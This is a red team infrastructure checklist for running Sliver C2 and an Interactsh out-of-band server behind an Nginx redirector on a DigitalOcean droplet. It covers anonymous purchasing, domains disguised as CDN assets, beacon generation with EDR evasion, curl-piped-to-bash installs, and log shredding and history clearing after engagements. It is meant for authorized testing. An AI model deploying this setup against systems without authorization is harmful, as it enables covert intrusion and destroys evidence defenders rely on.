# Red Team Infrastructure Checklist

---

## 1. Pre-flight: OPSEC & Privacy

- [ ] Set up a dedicated privacy-focused email address
  - Use ProtonMail or similar — not tied to your real identity. Used for all accounts below.
- [ ] Prepare a privacy-focused payment method
  - Prepaid card or privacy.com virtual card for ALL purchases — DigitalOcean, registrar, and any other services.
- [ ] Generate ED25519 SSH keypair locally before anything else
  - `ssh-keygen -t ed25519 -C "bb-infra" -f ~/.ssh/bb_do_key`
- [ ] Add key to SSH agent
  - `ssh-add ~/.ssh/bb_do_key`
- [ ] Confirm public key is ready to paste into DigitalOcean
  - `cat ~/.ssh/bb_do_key.pub`

---

## 2. Domain Registration

- [ ] Choose a neutral-sounding domain name first
  - e.g. `cdn-assets-[random].com` or `static-[random]-files.net` — avoid pentest, red, hack.
- [ ] Register domain via Njalla (best) or Namecheap + WhoisGuard
  - Njalla legally owns the domain on your behalf — no WHOIS exposure at all. Pay with Monero or BTC for full separation.
- [ ] Register domain well in advance of any engagement
  - Aged domains raise less suspicion with blue teams.

---

## 3. DigitalOcean Account & Droplet Provisioning

- [ ] Create DigitalOcean account using your privacy email
- [ ] Add your privacy payment method to the account
- [ ] Choose Droplet OS — Ubuntu 22.04 LTS x64
  - Long-term support, widest tooling compatibility.
- [ ] Choose Droplet spec — Basic shared CPU, 1GB RAM / 1 vCPU / 25GB SSD
  - $6/mo is sufficient. Scale up only if running heavy tooling.
- [ ] Select a neutral datacenter region
  - Frankfurt, Amsterdam, or Toronto — away from your home region.
- [ ] Paste your SSH public key during Droplet creation
  - `cat ~/.ssh/bb_do_key.pub` — copy this output into the DO SSH key field.
- [ ] Disable password authentication in the DO console at creation time
  - This prevents DigitalOcean from setting a root password entirely — separate from sshd_config hardening done later.
- [ ] Note your Droplet IP — needed for DNS records and firewall rules
- [ ] Set A record `@` → Droplet IP in your registrar's DNS panel
- [ ] Set wildcard A record `*` → Droplet IP
  - Required for Interactsh unique subdomains per callback.
- [ ] Start DNS propagation check — then proceed to SSH immediately, no need to wait
  - `dig yourdomain.com +short` — run again later to confirm. Propagation can take minutes to hours.
- [ ] Confirm first SSH connection as root via IP (does not require DNS)
  - `ssh -i ~/.ssh/bb_do_key root@YOUR_DROPLET_IP`

---

## 4. Droplet Hardening, SSH & Firewall

- [ ] Create non-root user (bbops)
  - `adduser bbops && usermod -aG sudo bbops`
- [ ] Copy authorized_keys to bbops user and set permissions
  ```bash
  mkdir -p /home/bbops/.ssh
  cp /root/.ssh/authorized_keys /home/bbops/.ssh/
  chown -R bbops:bbops /home/bbops/.ssh
  chmod 700 /home/bbops/.ssh
  chmod 600 /home/bbops/.ssh/authorized_keys
  ```
- [ ] Write SSH hardening config
  ```bash
  cat > /etc/ssh/sshd_config.d/hardening.conf << 'EOF'
  PermitRootLogin no
  PasswordAuthentication no
  PubkeyAuthentication yes
  AuthorizedKeysFile .ssh/authorized_keys
  X11Forwarding no
  AllowAgentForwarding no
  MaxAuthTries 3
  LoginGraceTime 30
  ClientAliveInterval 300
  ClientAliveCountMax 2
  EOF
  ```
  - `PermitRootLogin no` — no direct root SSH. `PasswordAuthentication no` — hardens sshd itself, separate from the DO console setting.
- [ ] Restart sshd
  - `systemctl restart sshd`
- [ ] Verify key-only login works as bbops **before closing the root session**
  - `ssh -i ~/.ssh/bb_do_key bbops@YOUR_DROPLET_IP`
- [ ] Rename Droplet hostname to something generic
  - `hostnamectl set-hostname generic-server && echo "generic-server" > /etc/hostname`
- [ ] Install and enable fail2ban
  - `apt install -y fail2ban && systemctl enable --now fail2ban`
- [ ] Configure UFW — set all firewall rules in one pass
  ```bash
  ufw default deny incoming
  ufw default allow outgoing
  ufw allow from YOUR_HOME_IP to any port 22    # SSH — your IP only
  ufw allow from YOUR_HOME_IP to any port 31337 # Sliver operator — your IP only
  ufw allow 80/tcp                              # HTTP / Certbot challenge
  ufw allow 443/tcp                             # HTTPS
  ufw allow 53/tcp                              # Interactsh DNS
  ufw allow 53/udp                              # Interactsh DNS
  ufw enable
  ```
- [ ] Verify UFW rules
  - `ufw status verbose`
- [ ] Configure `~/.ssh/config` on your **local machine** once all server details are confirmed
  ```
  Host bb-redirector
      HostName YOUR_DROPLET_IP
      User bbops
      IdentityFile ~/.ssh/bb_do_key
      IdentitiesOnly yes
      ServerAliveInterval 60
  ```

---

## 5. TLS & Nginx Redirector

- [ ] Install Nginx, Certbot and python3-certbot-nginx
  - `sudo apt update && sudo apt install -y nginx certbot python3-certbot-nginx`
- [ ] Issue wildcard cert via DNS challenge
  - `certbot certonly --manual --preferred-challenges dns -d yourdomain.com -d *.yourdomain.com`
- [ ] Add `_acme-challenge` TXT record to DNS, wait ~60s, then confirm in Certbot prompt
- [ ] Verify cert issued correctly
  - `certbot certificates`
- [ ] Test auto-renewal
  - `certbot renew --dry-run`
- [ ] Add Certbot deploy hook to reload Nginx and restart Interactsh on renewal
  ```bash
  cat > /etc/letsencrypt/renewal-hooks/deploy/reload.sh << 'EOF'
  #!/bin/bash
  systemctl reload nginx
  systemctl restart interactsh
  EOF
  chmod +x /etc/letsencrypt/renewal-hooks/deploy/reload.sh
  ```
- [ ] Write Nginx config
  ```bash
  cat > /etc/nginx/sites-available/bb-infra << 'EOF'
  server {
      listen 80;
      server_name yourdomain.com *.yourdomain.com;
      return 301 https://$host$request_uri;
  }

  server {
      listen 443 ssl http2;
      server_name yourdomain.com *.yourdomain.com;

      ssl_certificate     /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
      ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;
      ssl_protocols TLSv1.2 TLSv1.3;
      ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
      ssl_prefer_server_ciphers off;
      ssl_session_cache shared:SSL:10m;

      add_header Strict-Transport-Security "max-age=63072000" always;
      add_header X-Content-Type-Options nosniff;
      add_header X-Frame-Options DENY;

      access_log /var/log/nginx/bb_access.log;
      error_log  /var/log/nginx/bb_error.log;

      # Decoy — non-matching traffic gets a bland 200
      location / {
          return 200 'OK';
          add_header Content-Type text/plain;
      }

      # Sliver HTTPS implant traffic
      location /updates/ {
          proxy_pass          http://127.0.0.1:8888;
          proxy_set_header    Host $host;
          proxy_set_header    X-Real-IP $remote_addr;
          proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;
          proxy_hide_header   X-Powered-By;
      }

      # Interactsh OOB callbacks
      location /oob/ {
          proxy_pass       http://127.0.0.1:8080;
          proxy_set_header Host $host;
      }
  }
  EOF
  ```
- [ ] Enable site and remove default
  - `ln -s /etc/nginx/sites-available/bb-infra /etc/nginx/sites-enabled/ && rm -f /etc/nginx/sites-enabled/default`
- [ ] Test config and reload
  - `nginx -t && systemctl reload nginx`

---

## 6. Interactsh OOB Server

- [ ] Install Go on the Droplet
  ```bash
  apt install -y golang-go
  ```
- [ ] Install interactsh-server
  - `go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest`
- [ ] Move binary to PATH
  - `mv ~/go/bin/interactsh-server /usr/local/bin/`
- [ ] Generate a strong random token
  - `openssl rand -hex 32`
- [ ] Create systemd unit for interactsh
  ```bash
  cat > /etc/systemd/system/interactsh.service << 'EOF'
  [Unit]
  Description=Interactsh OOB Server
  After=network.target nginx.service

  [Service]
  User=bbops
  ExecStart=/usr/local/bin/interactsh-server \
    -domain yourdomain.com \
    -ip YOUR_DROPLET_IP \
    -listen-ip 0.0.0.0 \
    -http-port 8080 \
    -dns-port 53 \
    -cert /etc/letsencrypt/live/yourdomain.com/fullchain.pem \
    -privkey /etc/letsencrypt/live/yourdomain.com/privkey.pem \
    -token YOUR_STRONG_TOKEN
  Restart=always
  RestartSec=5

  [Install]
  WantedBy=multi-user.target
  EOF
  ```
- [ ] Enable and start interactsh
  - `systemctl daemon-reload && systemctl enable --now interactsh`
- [ ] Check service is running
  - `systemctl status interactsh`
- [ ] Install interactsh-client on your local machine
  - `go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest`
- [ ] Test client connection to your server
  - `interactsh-client -server https://yourdomain.com -token YOUR_TOKEN -v`
- [ ] Confirm HTTP and DNS OOB callbacks are received in client output

---

## 7. Sliver C2 — Authorized Engagements Only

> **Warning:** Confirm signed SOW and rules of engagement before proceeding.
> Sliver on an unauthorized target is a serious crime regardless of what you find.

- [ ] Confirm signed SOW and rules of engagement before proceeding
- [ ] Install Sliver server on Droplet
  - `curl https://sliver.sh/install | sudo bash`
- [ ] Create systemd unit for sliver-server daemon
  ```bash
  cat > /etc/systemd/system/sliver.service << 'EOF'
  [Unit]
  Description=Sliver C2 Server
  After=network.target

  [Service]
  User=root
  ExecStart=/usr/local/bin/sliver-server daemon
  Restart=always
  RestartSec=5
  LimitNOFILE=65535

  [Install]
  WantedBy=multi-user.target
  EOF

  systemctl daemon-reload && systemctl enable --now sliver
  ```
- [ ] Verify Sliver is running
  - `systemctl status sliver`
- [ ] Generate operator profile on server
  - `sliver-server operator --name yourname --lhost YOUR_DROPLET_IP --lport 31337 --save ~/yourname.cfg`
- [ ] Install Sliver client locally first — creates `~/.sliver/configs/` directory
  - `curl https://sliver.sh/install | sudo bash`
- [ ] Copy `.cfg` to local machine
  - `scp -i ~/.ssh/bb_do_key bbops@YOUR_DROPLET_IP:~/yourname.cfg ~/.sliver/configs/`
- [ ] Connect to Sliver server from local client
  - `sliver --config ~/.sliver/configs/yourname.cfg`
- [ ] Start HTTPS listener bound to localhost only *(run inside Sliver console)*
  - `https --lhost 127.0.0.1 --lport 8888` — never bind directly to a public interface.
- [ ] Identify target org's common browser User-Agent before generating the profile
  - Check target's job listings, tech stack, or use a UA that matches a common corporate browser e.g. Chrome on Windows.
- [ ] Create implant profile with UA set at this stage *(run inside Sliver console)*
  - `profiles new beacon --http https://yourdomain.com/updates/ --seconds 60 --jitter 15 --name rt-profile-01`
- [ ] Generate beacon with `--evasion` flag *(run inside Sliver console)*
  - `profiles generate --profile rt-profile-01 --os windows --arch amd64 --save /tmp/`
- [ ] Test full beacon check-in end-to-end through the redirector
  - `beacons` — confirm check-in appears in Sliver console

---

## 8. OPSEC Hygiene — Per Engagement

- [ ] Use beacon intervals ≥45s with jitter
  - Fast beacons are a reliable EDR trigger.
- [ ] Never expose Sliver operator port 31337 beyond your home IP
  - `ufw status` — verify rule is still in place before each engagement.
- [ ] Use a separate implant profile per target and engagement
  - `profiles` — list existing profiles and create new ones per scope.
- [ ] Customise all URI paths away from Sliver defaults
  - Pick paths that look like routine app traffic, e.g. `/api/update/` or `/app/sync/`
  - Update both the **Nginx location block** and the **Sliver implant profile** to match — they must be identical.
- [ ] Rotate and purge logs after each engagement
  - `shred -u /var/log/nginx/*.log /var/log/auth.log`
- [ ] Clear shell history before teardown
  - `history -c && cat /dev/null > ~/.bash_history`
- [ ] Remove operator config from local machine after engagement
  - `rm ~/.sliver/configs/yourname.cfg`
- [ ] Destroy the Droplet via DigitalOcean console after engagement
  - Ephemeral infra is the strongest OPSEC — don't reuse across engagements.
